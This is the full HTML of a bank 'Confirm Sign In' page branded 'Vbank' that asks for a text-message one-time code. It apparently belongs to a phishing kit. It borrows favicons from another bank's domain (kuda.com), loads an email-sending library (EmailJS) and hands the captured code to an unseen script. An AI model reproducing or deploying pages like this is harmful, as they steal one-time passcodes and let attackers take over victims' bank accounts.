<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="icon"
      href="https://kuda.com/icons/icon-48x48.png?v=817086b560dfc1021d60b8ab9b66d485"
      type="image/svg+xml"
    />
    <link
      rel="icon"
      href="https://kuda.com/icons/icon-48x48.png?v=817086b560dfc1021d60b8ab9b66d485"
      type="image/png"
    />
    <title>Vbank - VBank</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="stylesheet" href="otp.css" />
  </head>
  <body>
    <div class="container">
      <div class="contentSec">
        <div class="title">Confirm Sign In</div>
        <span>We sent a you a code by text message</span>
      </div>
      <div class="loginWrapper">
        <div class="loginSec">
          <form method="post" id="myForm">
            <label for="otp">Code</label>
            <div class="formInput">
              <input
                id="otp"
                name="otp"
                type="text"
                required
                placeholder="*****"
                oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                inputmode="numeric"
                pattern="[0-9]*"
              />
            </div>

            <button id="submitBtn" type="submit">Sign In</button>
          </form>
        </div>
      </div>
    </div>

    <!-- Add this to the head of your HTML file -->
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="otp.script.js"></script>
  </body>
</html>
